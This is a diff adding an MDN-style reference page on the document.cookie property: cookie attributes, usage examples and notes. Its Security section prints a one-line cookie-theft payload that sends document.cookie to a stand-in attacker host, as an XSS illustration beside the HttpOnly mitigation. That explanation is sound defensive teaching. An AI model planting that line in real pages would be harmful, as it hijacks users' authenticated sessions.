@@ -1,0 +1,258 @@
+<p>{{APIRef(“DOM”)}}</p>
+<p>The {{domxref(“Document”)}} property <code>cookie</code> lets you read and write <a href="/en-US/docs/Web/HTTP/Cookies">cookies</a> associated with the document. It serves as a getter and setter for the actual values of the cookies.</p>
+<h2 id="syntax">Syntax</h2>
+<h3 id="read-all-cookies-accessible-from-this-location">Read all cookies accessible from this location</h3>
+<div class="sourceCode" id="cb1"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb1-1" title="1">allCookies <span class="op">=</span> <span class="va">document</span>.<span class="at">cookie</span><span class="op">;</span></a></code></pre></div>
+<p>In the code above <code>allCookies</code> is a string containing a semicolon-separated list of all cookies (i.e. <code>key=value</code> pairs). Note that each <em>key</em> and <em>value</em> may be surrounded by whitespace (space and tab characters): in fact, {{RFC(6265)}} mandates a single space after each semicolon, but some user agents may not abide by this.</p>
+<h3 id="write-a-new-cookie">Write a new cookie</h3>
+<div class="sourceCode" id="cb2"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb2-1" title="1"><span class="va">document</span>.<span class="at">cookie</span> <span class="op">=</span> newCookie<span class="op">;</span></a></code></pre></div>
+<p>In the code above, <code>newCookie</code> is a string of form <code>key=value</code>. Note that you can only set/update a single cookie at a time using this method. Consider also that:</p>
+<ul>
+<li><p>Any of the following cookie attribute values can optionally follow the key-value pair, specifying the cookie to set/update, and preceded by a semi-colon separator:</p>
+<ul>
+<li><p><code>;path=path</code> (e.g., ‘<code>/</code>’, ‘<code>/mydir</code>’) If not specified, defaults to the current path of the current document location.</p>
+<blockquote>
+<p><strong>Note:</strong> Prior to {{Gecko(“6.0”)}}, paths with quotes were treated as if the quotes were part of the string, instead of as if they were delimiters surrounding the actual path string. This has been fixed.</p>
+</blockquote></li>
+<li><p><code>;domain=domain</code> (e.g., ‘<code>example.com</code>’ or ‘<code>subdomain.example.com</code>’). If not specified, this defaults to the host portion of the current document location. Contrary to earlier specifications, leading dots in domain names are ignored, but browsers may decline to set the cookie containing such dots. If a domain is specified, subdomains are always included.</p>
+<blockquote>
+<p><strong>Note:</strong> The domain <em>must</em> match the domain of the JavaScript origin. Setting cookies to foreign domains will be silently ignored.</p>
+</blockquote></li>
+<li><code>;max-age=max-age-in-seconds</code> (e.g., <code>60*60*24*365</code> or 31536000 for a year)</li>
+<li><p><code>;expires=date-in-GMTString-format</code> If neither <code>expires</code> nor <code>max-age</code> specified it will expire at the end of session.</p>
+<blockquote>
+<p><strong>Warning:</strong> When user privacy is a concern, it’s important that any web app implementation invalidate cookie data after a certain timeout instead of relying on the browser to do it. Many browsers let users specify that cookies should never expire, which is not necessarily safe.</p>
+</blockquote>
+<ul>
+<li>See {{jsxref(“Date.toUTCString()”)}} for help formatting this value.</li>
+</ul></li>
+<li><code>;secure</code> Cookie to only be transmitted over secure protocol as https. Before Chrome 52, this flag could appear with cookies from http domains.</li>
+<li><p><code>;samesite</code> <a href="/en-US/docs/Web/HTTP/Cookies#samesite_cookies">SameSite</a> prevents the browser from sending this cookie along with cross-site requests. Possible values are <code>lax</code>, <code>strict</code> or <code>none</code>.</p>
+<ul>
+<li>The <code>lax</code> value will send the cookie for all same-site requests and top-level navigation GET requests. This is sufficient for user tracking, but it will prevent many <a href="/en-US/docs/Glossary/CSRF">Cross-Site Request Forgery</a> (CSRF) attacks. This is the default value in modern browsers.</li>
+<li>The <code>strict</code> value will prevent the cookie from being sent by the browser to the target site in all cross-site browsing contexts, even when following a regular link.</li>
+<li>The <code>none</code> value explicitly states no restrictions will be applied. The cookie will be sent in all requests—both cross-site and same-site.</li>
+</ul></li>
+</ul></li>
+<li>The cookie value string can use {{jsxref(“Global_Objects/encodeURIComponent”, “encodeURIComponent()”)}} to ensure that the string does not contain any commas, semicolons, or whitespace (which are disallowed in cookie values).</li>
+<li><p>Some user agent implementations support the following cookie prefixes:</p>
+<ul>
+<li><code>__Secure-</code> Signals to the browser that it should only include the cookie in requests transmitted over a secure channel.</li>
+<li><code>__Host-</code> Signals to the browser that in addition to the restriction to only use the cookie from a secure origin, the scope of the cookie is limited to a path attribute passed down by the server. If the server omits the path attribute the “directory” of the request URI is used. It also signals that the domain attribute must not be present, which prevents the cookie from being sent to other domains. For Chrome the path attribute must always be the origin.</li>
+</ul>
+<blockquote>
+<p><strong>Note:</strong> The dash is considered part of the prefix.</p>
+</blockquote>
+<blockquote>
+<p><strong>Note:</strong> These flags are only settable with the <code>secure</code> attribute.</p>
+</blockquote></li>
+</ul>
+<blockquote>
+<p><strong>Note:</strong> As you can see from the code above, <code>document.cookie</code> is an <a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description">accessor property</a> with native <em>setter</em> and <em>getter</em> functions, and consequently is <em>not</em> a <a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description">data property</a> with a value: what you write is not the same as what you read, everything is always mediated by the JavaScript interpreter.</p>
+</blockquote>
+<h2 id="examples">Examples</h2>
+<h3 id="example-1-simple-usage">Example #1: Simple usage</h3>
+<div class="sourceCode" id="cb3"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb3-1" title="1"><span class="co">// Note that we are setting `SameSite=None;` in this example because the example</span></a>
+<a class="sourceLine" id="cb3-2" title="2"><span class="co">// needs to work cross-origin.</span></a>
+<a class="sourceLine" id="cb3-3" title="3"><span class="co">// It is more common not to set the `SameSite` attribute, which results in the default,</span></a>
+<a class="sourceLine" id="cb3-4" title="4"><span class="co">// and more secure, value of `SameSite=Lax;`</span></a>
+<a class="sourceLine" id="cb3-5" title="5"><span class="va">document</span>.<span class="at">cookie</span> <span class="op">=</span> <span class="st">&quot;name=oeschger; SameSite=None; Secure&quot;</span><span class="op">;</span></a>
+<a class="sourceLine" id="cb3-6" title="6"><span class="va">document</span>.<span class="at">cookie</span> <span class="op">=</span> <span class="st">&quot;favorite_food=tripe; SameSite=None; Secure&quot;</span><span class="op">;</span></a>
+<a class="sourceLine" id="cb3-7" title="7"></a>
+<a class="sourceLine" id="cb3-8" title="8"><span class="kw">function</span> <span class="at">showCookies</span>() <span class="op">{</span></a>
+<a class="sourceLine" id="cb3-9" title="9">  <span class="kw">const</span> output <span class="op">=</span> <span class="va">document</span>.<span class="at">getElementById</span>(<span class="st">&#39;cookies&#39;</span>)</a>
+<a class="sourceLine" id="cb3-10" title="10">  <span class="va">output</span>.<span class="at">textContent</span> <span class="op">=</span> <span class="st">&#39;&gt; &#39;</span> <span class="op">+</span> <span class="va">document</span>.<span class="at">cookie</span></a>
+<a class="sourceLine" id="cb3-11" title="11"><span class="op">}</span></a>
+<a class="sourceLine" id="cb3-12" title="12"></a>
+<a class="sourceLine" id="cb3-13" title="13"><span class="kw">function</span> <span class="at">clearOutputCookies</span>() <span class="op">{</span></a>
+<a class="sourceLine" id="cb3-14" title="14">  <span class="kw">const</span> output <span class="op">=</span> <span class="va">document</span>.<span class="at">getElementById</span>(<span class="st">&#39;cookies&#39;</span>)</a>
+<a class="sourceLine" id="cb3-15" title="15">  <span class="va">output</span>.<span class="at">textContent</span> <span class="op">=</span> <span class="st">&#39;&#39;</span></a>
+<a class="sourceLine" id="cb3-16" title="16"><span class="op">}</span></a></code></pre></div>
+<div class="sourceCode" id="cb4"><pre class="sourceCode html"><code class="sourceCode html"><a class="sourceLine" id="cb4-1" title="1"><span class="kw">&lt;button</span><span class="ot"> onclick=</span><span class="st">&quot;showCookies()&quot;</span><span class="kw">&gt;</span>Show cookies<span class="kw">&lt;/button&gt;</span></a>
+<a class="sourceLine" id="cb4-2" title="2"></a>
+<a class="sourceLine" id="cb4-3" title="3"><span class="kw">&lt;button</span><span class="ot"> onclick=</span><span class="st">&quot;clearOutputCookies()&quot;</span><span class="kw">&gt;</span></a>
+<a class="sourceLine" id="cb4-4" title="4">  Clear</a>
+<a class="sourceLine" id="cb4-5" title="5"><span class="kw">&lt;/button&gt;</span></a>
+<a class="sourceLine" id="cb4-6" title="6"></a>
+<a class="sourceLine" id="cb4-7" title="7"><span class="kw">&lt;div&gt;</span></a>
+<a class="sourceLine" id="cb4-8" title="8">  <span class="kw">&lt;code</span><span class="ot"> id=</span><span class="st">&quot;cookies&quot;</span><span class="kw">&gt;&lt;/code&gt;</span></a>
+<a class="sourceLine" id="cb4-9" title="9"><span class="kw">&lt;/div&gt;</span></a></code></pre></div>
+<p>{{EmbedLiveSample(‘Example_1_Simple_usage’, 200, 72)}}</p>
+<h3 id="example-2-get-a-sample-cookie-named-test2">Example #2: Get a sample cookie named <em>test2</em></h3>
+<div class="sourceCode" id="cb5"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb5-1" title="1"><span class="co">// Note that we are setting `SameSite=None;` in this example because the example</span></a>
+<a class="sourceLine" id="cb5-2" title="2"><span class="co">// needs to work cross-origin.</span></a>
+<a class="sourceLine" id="cb5-3" title="3"><span class="co">// It is more common not to set the `SameSite` attribute, which results in the default,</span></a>
+<a class="sourceLine" id="cb5-4" title="4"><span class="co">// and more secure, value of `SameSite=Lax;`</span></a>
+<a class="sourceLine" id="cb5-5" title="5"><span class="va">document</span>.<span class="at">cookie</span> <span class="op">=</span> <span class="st">&quot;test1=Hello; SameSite=None; Secure&quot;</span><span class="op">;</span></a>
+<a class="sourceLine" id="cb5-6" title="6"><span class="va">document</span>.<span class="at">cookie</span> <span class="op">=</span> <span class="st">&quot;test2=World; SameSite=None; Secure&quot;</span><span class="op">;</span></a>
+<a class="sourceLine" id="cb5-7" title="7"></a>
+<a class="sourceLine" id="cb5-8" title="8"><span class="kw">const</span> cookieValue <span class="op">=</span> <span class="va">document</span>.<span class="at">cookie</span></a>
+<a class="sourceLine" id="cb5-9" title="9">  .<span class="at">split</span>(<span class="st">&#39;; &#39;</span>)</a>
+<a class="sourceLine" id="cb5-10" title="10">  .<span class="at">find</span>(row <span class="kw">=&gt;</span> <span class="va">row</span>.<span class="at">startsWith</span>(<span class="st">&#39;test2=&#39;</span>))</a>
+<a class="sourceLine" id="cb5-11" title="11">  .<span class="at">split</span>(<span class="st">&#39;=&#39;</span>)[<span class="dv">1</span>]<span class="op">;</span></a>
+<a class="sourceLine" id="cb5-12" title="12"></a>
+<a class="sourceLine" id="cb5-13" title="13"><span class="kw">function</span> <span class="at">showCookieValue</span>() <span class="op">{</span></a>
+<a class="sourceLine" id="cb5-14" title="14">  <span class="kw">const</span> output <span class="op">=</span> <span class="va">document</span>.<span class="at">getElementById</span>(<span class="st">&#39;cookie-value&#39;</span>)</a>
+<a class="sourceLine" id="cb5-15" title="15">  <span class="va">output</span>.<span class="at">textContent</span> <span class="op">=</span> <span class="st">&#39;&gt; &#39;</span> <span class="op">+</span> cookieValue</a>
+<a class="sourceLine" id="cb5-16" title="16"><span class="op">}</span></a>
+<a class="sourceLine" id="cb5-17" title="17"></a>
+<a class="sourceLine" id="cb5-18" title="18"><span class="kw">function</span> <span class="at">clearOutputCookieValue</span>() <span class="op">{</span></a>
+<a class="sourceLine" id="cb5-19" title="19">  <span class="kw">const</span> output <span class="op">=</span> <span class="va">document</span>.<span class="at">getElementById</span>(<span class="st">&#39;cookie-value&#39;</span>)</a>
+<a class="sourceLine" id="cb5-20" title="20">  <span class="va">output</span>.<span class="at">textContent</span> <span class="op">=</span> <span class="st">&#39;&#39;</span></a>
+<a class="sourceLine" id="cb5-21" title="21"><span class="op">}</span></a></code></pre></div>
+<div class="sourceCode" id="cb6"><pre class="sourceCode html"><code class="sourceCode html"><a class="sourceLine" id="cb6-1" title="1"><span class="kw">&lt;button</span><span class="ot"> onclick=</span><span class="st">&quot;showCookieValue()&quot;</span><span class="kw">&gt;</span>Show cookie value<span class="kw">&lt;/button&gt;</span></a>
+<a class="sourceLine" id="cb6-2" title="2"></a>
+<a class="sourceLine" id="cb6-3" title="3"><span class="kw">&lt;button</span><span class="ot"> onclick=</span><span class="st">&quot;clearOutputCookieValue()&quot;</span><span class="kw">&gt;</span></a>
+<a class="sourceLine" id="cb6-4" title="4">  Clear</a>
+<a class="sourceLine" id="cb6-5" title="5"><span class="kw">&lt;/button&gt;</span></a>
+<a class="sourceLine" id="cb6-6" title="6"></a>
+<a class="sourceLine" id="cb6-7" title="7"><span class="kw">&lt;div&gt;</span></a>
+<a class="sourceLine" id="cb6-8" title="8">  <span class="kw">&lt;code</span><span class="ot"> id=</span><span class="st">&quot;cookie-value&quot;</span><span class="kw">&gt;&lt;/code&gt;</span></a>
+<a class="sourceLine" id="cb6-9" title="9"><span class="kw">&lt;/div&gt;</span></a></code></pre></div>
+<p>{{EmbedLiveSample(‘Example_2_Get_a_sample_cookie_named_test2’, 200, 72)}}</p>
+<h3 id="example-3-do-something-only-once">Example #3: Do something only once</h3>
+<p>In order to use the following code, please replace all occurrences of the word <code>doSomethingOnlyOnce</code> (the name of the cookie) with a custom name.</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb7-1" title="1"><span class="kw">function</span> <span class="at">doOnce</span>() <span class="op">{</span></a>
+<a class="sourceLine" id="cb7-2" title="2">  <span class="cf">if</span> (<span class="op">!</span><span class="va">document</span>.<span class="va">cookie</span>.<span class="at">split</span>(<span class="st">&#39;; &#39;</span>).<span class="at">find</span>(row <span class="kw">=&gt;</span> <span class="va">row</span>.<span class="at">startsWith</span>(<span class="st">&#39;doSomethingOnlyOnce&#39;</span>))) <span class="op">{</span></a>
+<a class="sourceLine" id="cb7-3" title="3">    <span class="co">// Note that we are setting `SameSite=None;` in this example because the example</span></a>
+<a class="sourceLine" id="cb7-4" title="4">    <span class="co">// needs to work cross-origin.</span></a>
+<a class="sourceLine" id="cb7-5" title="5">    <span class="co">// It is more common not to set the `SameSite` attribute, which results in the default,</span></a>
+<a class="sourceLine" id="cb7-6" title="6">    <span class="co">// and more secure, value of `SameSite=Lax;`</span></a>
+<a class="sourceLine" id="cb7-7" title="7">    <span class="va">document</span>.<span class="at">cookie</span> <span class="op">=</span> <span class="st">&quot;doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure&quot;</span><span class="op">;</span></a>
+<a class="sourceLine" id="cb7-8" title="8"></a>
+<a class="sourceLine" id="cb7-9" title="9">    <span class="kw">const</span> output <span class="op">=</span> <span class="va">document</span>.<span class="at">getElementById</span>(<span class="st">&#39;do-once&#39;</span>)</a>
+<a class="sourceLine" id="cb7-10" title="10">    <span class="va">output</span>.<span class="at">textContent</span> <span class="op">=</span> <span class="st">&#39;&gt; Do something here!&#39;</span></a>
+<a class="sourceLine" id="cb7-11" title="11">  <span class="op">}</span></a>
+<a class="sourceLine" id="cb7-12" title="12"><span class="op">}</span></a>
+<a class="sourceLine" id="cb7-13" title="13"></a>
+<a class="sourceLine" id="cb7-14" title="14"><span class="kw">function</span> <span class="at">clearOutputDoOnce</span>() <span class="op">{</span></a>
+<a class="sourceLine" id="cb7-15" title="15">  <span class="kw">const</span> output <span class="op">=</span> <span class="va">document</span>.<span class="at">getElementById</span>(<span class="st">&#39;do-once&#39;</span>)</a>
+<a class="sourceLine" id="cb7-16" title="16">  <span class="va">output</span>.<span class="at">textContent</span> <span class="op">=</span> <span class="st">&#39;&#39;</span></a>
+<a class="sourceLine" id="cb7-17" title="17"><span class="op">}</span></a></code></pre></div>
+<div class="sourceCode" id="cb8"><pre class="sourceCode html"><code class="sourceCode html"><a class="sourceLine" id="cb8-1" title="1"><span class="kw">&lt;button</span><span class="ot"> onclick=</span><span class="st">&quot;doOnce()&quot;</span><span class="kw">&gt;</span>Only do something once<span class="kw">&lt;/button&gt;</span></a>
+<a class="sourceLine" id="cb8-2" title="2"></a>
+<a class="sourceLine" id="cb8-3" title="3"><span class="kw">&lt;button</span><span class="ot"> onclick=</span><span class="st">&quot;clearOutputDoOnce()&quot;</span><span class="kw">&gt;</span></a>
+<a class="sourceLine" id="cb8-4" title="4">  Clear</a>
+<a class="sourceLine" id="cb8-5" title="5"><span class="kw">&lt;/button&gt;</span></a>
+<a class="sourceLine" id="cb8-6" title="6"></a>
+<a class="sourceLine" id="cb8-7" title="7"><span class="kw">&lt;div&gt;</span></a>
+<a class="sourceLine" id="cb8-8" title="8">  <span class="kw">&lt;code</span><span class="ot"> id=</span><span class="st">&quot;do-once&quot;</span><span class="kw">&gt;&lt;/code&gt;</span></a>
+<a class="sourceLine" id="cb8-9" title="9"><span class="kw">&lt;/div&gt;</span></a></code></pre></div>
+<p>{{EmbedLiveSample(‘Example_3_Do_something_only_once’, 200, 72)}}</p>
+<h3 id="example-4-reset-the-previous-cookie">Example #4: Reset the previous cookie</h3>
+<div class="sourceCode" id="cb9"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb9-1" title="1"><span class="kw">function</span> <span class="at">resetOnce</span>() <span class="op">{</span></a>
+<a class="sourceLine" id="cb9-2" title="2">  <span class="co">// Note that we are setting `SameSite=None;` in this example because the example</span></a>
+<a class="sourceLine" id="cb9-3" title="3">  <span class="co">// needs to work cross-origin.</span></a>
+<a class="sourceLine" id="cb9-4" title="4">  <span class="co">// It is more common not to set the `SameSite` attribute, which results in the default,</span></a>
+<a class="sourceLine" id="cb9-5" title="5">  <span class="co">// and more secure, value of `SameSite=Lax;`</span></a>
+<a class="sourceLine" id="cb9-6" title="6">  <span class="va">document</span>.<span class="at">cookie</span> <span class="op">=</span> <span class="st">&quot;doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure&quot;</span><span class="op">;</span></a>
+<a class="sourceLine" id="cb9-7" title="7"></a>
+<a class="sourceLine" id="cb9-8" title="8">  <span class="kw">const</span> output <span class="op">=</span> <span class="va">document</span>.<span class="at">getElementById</span>(<span class="st">&#39;reset-once&#39;</span>)</a>
+<a class="sourceLine" id="cb9-9" title="9">  <span class="va">output</span>.<span class="at">textContent</span> <span class="op">=</span> <span class="st">&#39;&gt; Reset!&#39;</span></a>
+<a class="sourceLine" id="cb9-10" title="10"><span class="op">}</span></a>
+<a class="sourceLine" id="cb9-11" title="11"></a>
+<a class="sourceLine" id="cb9-12" title="12"><span class="kw">function</span> <span class="at">clearOutputResetOnce</span>() <span class="op">{</span></a>
+<a class="sourceLine" id="cb9-13" title="13">  <span class="kw">const</span> output <span class="op">=</span> <span class="va">document</span>.<span class="at">getElementById</span>(<span class="st">&#39;reset-once&#39;</span>)</a>
+<a class="sourceLine" id="cb9-14" title="14">  <span class="va">output</span>.<span class="at">textContent</span> <span class="op">=</span> <span class="st">&#39;&#39;</span></a>
+<a class="sourceLine" id="cb9-15" title="15"><span class="op">}</span></a></code></pre></div>
+<div class="sourceCode" id="cb10"><pre class="sourceCode html"><code class="sourceCode html"><a class="sourceLine" id="cb10-1" title="1"><span class="kw">&lt;button</span><span class="ot"> onclick=</span><span class="st">&quot;resetOnce()&quot;</span><span class="kw">&gt;</span>Reset only once cookie<span class="kw">&lt;/button&gt;</span></a>
+<a class="sourceLine" id="cb10-2" title="2"></a>
+<a class="sourceLine" id="cb10-3" title="3"><span class="kw">&lt;button</span><span class="ot"> onclick=</span><span class="st">&quot;clearOutputResetOnce()&quot;</span><span class="kw">&gt;</span></a>
+<a class="sourceLine" id="cb10-4" title="4">  Clear</a>
+<a class="sourceLine" id="cb10-5" title="5"><span class="kw">&lt;/button&gt;</span></a>
+<a class="sourceLine" id="cb10-6" title="6"></a>
+<a class="sourceLine" id="cb10-7" title="7"><span class="kw">&lt;div&gt;</span></a>
+<a class="sourceLine" id="cb10-8" title="8">  <span class="kw">&lt;code</span><span class="ot"> id=</span><span class="st">&quot;reset-once&quot;</span><span class="kw">&gt;&lt;/code&gt;</span></a>
+<a class="sourceLine" id="cb10-9" title="9"><span class="kw">&lt;/div&gt;</span></a></code></pre></div>
+<p>{{EmbedLiveSample(‘Example_4_Reset_the_previous_cookie’, 200, 72)}}</p>
+<h3 id="example-5-check-a-cookie-existence">Example #5: Check a cookie existence</h3>
+<div class="sourceCode" id="cb11"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb11-1" title="1"><span class="co">// Note that we are setting `SameSite=None;` in this example because the example</span></a>
+<a class="sourceLine" id="cb11-2" title="2"><span class="co">// needs to work cross-origin.</span></a>
+<a class="sourceLine" id="cb11-3" title="3"><span class="co">// It is more common not to set the `SameSite` attribute, which results in the default,</span></a>
+<a class="sourceLine" id="cb11-4" title="4"><span class="co">// and more secure, value of `SameSite=Lax;`</span></a>
+<a class="sourceLine" id="cb11-5" title="5"><span class="va">document</span>.<span class="at">cookie</span> <span class="op">=</span> <span class="st">&quot;reader=1; SameSite=None; Secure&quot;</span><span class="op">;</span></a>
+<a class="sourceLine" id="cb11-6" title="6"></a>
+<a class="sourceLine" id="cb11-7" title="7"><span class="kw">function</span> <span class="at">checkACookieExists</span>() <span class="op">{</span></a>
+<a class="sourceLine" id="cb11-8" title="8">  <span class="cf">if</span> (<span class="va">document</span>.<span class="va">cookie</span>.<span class="at">split</span>(<span class="st">&#39;;&#39;</span>).<span class="at">some</span>((item) <span class="kw">=&gt;</span> <span class="va">item</span>.<span class="at">trim</span>().<span class="at">startsWith</span>(<span class="st">&#39;reader=&#39;</span>))) <span class="op">{</span></a>
+<a class="sourceLine" id="cb11-9" title="9">    <span class="kw">const</span> output <span class="op">=</span> <span class="va">document</span>.<span class="at">getElementById</span>(<span class="st">&#39;a-cookie-existence&#39;</span>)</a>
+<a class="sourceLine" id="cb11-10" title="10">    <span class="va">output</span>.<span class="at">textContent</span> <span class="op">=</span> <span class="st">&#39;&gt; The cookie &quot;reader&quot; exists&#39;</span></a>
+<a class="sourceLine" id="cb11-11" title="11">  <span class="op">}</span></a>
+<a class="sourceLine" id="cb11-12" title="12"><span class="op">}</span></a>
+<a class="sourceLine" id="cb11-13" title="13"></a>
+<a class="sourceLine" id="cb11-14" title="14"><span class="kw">function</span> <span class="at">clearOutputACookieExists</span>() <span class="op">{</span></a>
+<a class="sourceLine" id="cb11-15" title="15">  <span class="kw">const</span> output <span class="op">=</span> <span class="va">document</span>.<span class="at">getElementById</span>(<span class="st">&#39;a-cookie-existence&#39;</span>)</a>
+<a class="sourceLine" id="cb11-16" title="16">  <span class="va">output</span>.<span class="at">textContent</span> <span class="op">=</span> <span class="st">&#39;&#39;</span></a>
+<a class="sourceLine" id="cb11-17" title="17"><span class="op">}</span></a></code></pre></div>
+<div class="sourceCode" id="cb12"><pre class="sourceCode html"><code class="sourceCode html"><a class="sourceLine" id="cb12-1" title="1"><span class="kw">&lt;button</span><span class="ot"> onclick=</span><span class="st">&quot;checkACookieExists()&quot;</span><span class="kw">&gt;</span></a>
+<a class="sourceLine" id="cb12-2" title="2">  Check a cookie exists</a>
+<a class="sourceLine" id="cb12-3" title="3"><span class="kw">&lt;/button&gt;</span></a>
+<a class="sourceLine" id="cb12-4" title="4"></a>
+<a class="sourceLine" id="cb12-5" title="5"><span class="kw">&lt;button</span><span class="ot"> onclick=</span><span class="st">&quot;clearOutputACookieExists()&quot;</span><span class="kw">&gt;</span></a>
+<a class="sourceLine" id="cb12-6" title="6">  Clear</a>
+<a class="sourceLine" id="cb12-7" title="7"><span class="kw">&lt;/button&gt;</span></a>
+<a class="sourceLine" id="cb12-8" title="8"></a>
+<a class="sourceLine" id="cb12-9" title="9"><span class="kw">&lt;div&gt;</span></a>
+<a class="sourceLine" id="cb12-10" title="10">  <span class="kw">&lt;code</span><span class="ot"> id=</span><span class="st">&quot;a-cookie-existence&quot;</span><span class="kw">&gt;&lt;/code&gt;</span></a>
+<a class="sourceLine" id="cb12-11" title="11"><span class="kw">&lt;/div&gt;</span></a></code></pre></div>
+<p>{{EmbedLiveSample(‘Example_5_Check_a_cookie_existence’, 200, 72)}}</p>
+<h3 id="example-6-check-that-a-cookie-has-a-specific-value">Example #6: Check that a cookie has a specific value</h3>
+<div class="sourceCode" id="cb13"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb13-1" title="1"><span class="kw">function</span> <span class="at">checkCookieHasASpecificValue</span>() <span class="op">{</span></a>
+<a class="sourceLine" id="cb13-2" title="2">  <span class="cf">if</span> (<span class="va">document</span>.<span class="va">cookie</span>.<span class="at">split</span>(<span class="st">&#39;;&#39;</span>).<span class="at">some</span>((item) <span class="kw">=&gt;</span> <span class="va">item</span>.<span class="at">includes</span>(<span class="st">&#39;reader=1&#39;</span>))) <span class="op">{</span></a>
+<a class="sourceLine" id="cb13-3" title="3">    <span class="kw">const</span> output <span class="op">=</span> <span class="va">document</span>.<span class="at">getElementById</span>(<span class="st">&#39;a-specific-value-of-the-cookie&#39;</span>)</a>
+<a class="sourceLine" id="cb13-4" title="4">    <span class="va">output</span>.<span class="at">textContent</span> <span class="op">=</span> <span class="st">&#39;&gt; The cookie &quot;reader&quot; has a value of &quot;1&quot;&#39;</span></a>
+<a class="sourceLine" id="cb13-5" title="5">  <span class="op">}</span></a>
+<a class="sourceLine" id="cb13-6" title="6"><span class="op">}</span></a>
+<a class="sourceLine" id="cb13-7" title="7"></a>
+<a class="sourceLine" id="cb13-8" title="8"><span class="kw">function</span> <span class="at">clearASpecificValueOfTheCookie</span>() <span class="op">{</span></a>
+<a class="sourceLine" id="cb13-9" title="9">  <span class="kw">const</span> output <span class="op">=</span> <span class="va">document</span>.<span class="at">getElementById</span>(<span class="st">&#39;a-specific-value-of-the-cookie&#39;</span>)</a>
+<a class="sourceLine" id="cb13-10" title="10">  <span class="va">output</span>.<span class="at">textContent</span> <span class="op">=</span> <span class="st">&#39;&#39;</span></a>
+<a class="sourceLine" id="cb13-11" title="11"><span class="op">}</span></a></code></pre></div>
+<div class="sourceCode" id="cb14"><pre class="sourceCode html"><code class="sourceCode html"><a class="sourceLine" id="cb14-1" title="1"><span class="kw">&lt;button</span><span class="ot"> onclick=</span><span class="st">&quot;checkCookieHasASpecificValue()&quot;</span><span class="kw">&gt;</span></a>
+<a class="sourceLine" id="cb14-2" title="2">  Check that a cookie has a specific value</a>
+<a class="sourceLine" id="cb14-3" title="3"><span class="kw">&lt;/button&gt;</span></a>
+<a class="sourceLine" id="cb14-4" title="4"></a>
+<a class="sourceLine" id="cb14-5" title="5"><span class="kw">&lt;button</span><span class="ot"> onclick=</span><span class="st">&quot;clearASpecificValueOfTheCookie()&quot;</span><span class="kw">&gt;</span></a>
+<a class="sourceLine" id="cb14-6" title="6">  Clear</a>
+<a class="sourceLine" id="cb14-7" title="7"><span class="kw">&lt;/button&gt;</span></a>
+<a class="sourceLine" id="cb14-8" title="8"></a>
+<a class="sourceLine" id="cb14-9" title="9"><span class="kw">&lt;div&gt;</span></a>
+<a class="sourceLine" id="cb14-10" title="10">  <span class="kw">&lt;code</span><span class="ot"> id=</span><span class="st">&quot;a-specific-value-of-the-cookie&quot;</span><span class="kw">&gt;&lt;/code&gt;</span></a>
+<a class="sourceLine" id="cb14-11" title="11"><span class="kw">&lt;/div&gt;</span></a></code></pre></div>
+<p>{{EmbedLiveSample(‘Example_6_Check_that_a_cookie_has_a_specific_value’, 200, 72)}}</p>
+<h2 id="security">Security</h2>
+<p>It is important to note that the <code>path</code> attribute does <em>not</em> protect against unauthorized reading of the cookie from a different path. It can be easily bypassed using the DOM, for example by creating a hidden {{HTMLElement(“iframe”)}} element with the path of the cookie, then accessing this iframe’s <code>contentDocument.cookie</code> property. The only way to protect the cookie is by using a different domain or subdomain, due to the <a href="/en-US/docs/Web/Security/Same-origin_policy">same origin policy</a>.</p>
+<p>Cookies are often used in web applications to identify a user and their authenticated session. Stealing a cookie from a web application leads to hijacking the authenticated user’s session. Common ways to steal cookies include using <a href="https://en.wikipedia.org/wiki/Social_engineering_(security)">social engineering</a> or by exploiting a <a href="/en-US/docs/Glossary/Cross-site_scripting">cross-site scripting</a> (XSS) vulnerability in the application -</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb15-1" title="1">(<span class="kw">new</span> <span class="at">Image</span>()).<span class="at">src</span> <span class="op">=</span> <span class="st">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> <span class="op">+</span> <span class="va">document</span>.<span class="at">cookie</span><span class="op">;</span></a></code></pre></div>
+<p>The <code>HTTPOnly</code> cookie attribute can help to mitigate this attack by preventing access to cookie value through Javascript. Read more about <a href="https://www.nczonline.net/blog/2009/05/12/cookies-and-security/">Cookies and Security</a>.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li>Starting with Firefox 2, a better mechanism for client-side storage is available - <a href="/en-US/docs/Web/API/Web_Storage_API">WHATWG DOM Storage</a>.</li>
+<li>You can delete a cookie by updating its expiration time to zero.</li>
+<li>Keep in mind that the more cookies you have, the more data will be transferred between the server and the client for each request. This will make each request slower. It is highly recommended for you to use <a href="/en-US/docs/Web/API/Web_Storage_API">WHATWG DOM Storage</a> if you are going to keep “client-only” data.</li>
+<li><a href="https://www.ietf.org/rfc/rfc2965.txt">RFC 2965</a> (Section 5.3, “Implementation Limits”) specifies that there should be <strong>no maximum length</strong> of a cookie’s key or value size, and encourages implementations to support <strong>arbitrarily large cookies</strong>. Each browser’s implementation maximum will necessarily be different, so consult individual browser documentation.</li>
+</ul>
+<p>The reason for the <a href="#syntax">syntax</a> of the <code>document.cookie</code> accessor property is due to the client-server nature of cookies, which differs from other client-client storage methods (like, for instance, <a href="/en-US/docs/Web/API/Web_Storage_API">localStorage</a>):</p>
+<h4 id="the-server-tells-the-client-to-store-a-cookie">The server tells the client to store a cookie</h4>
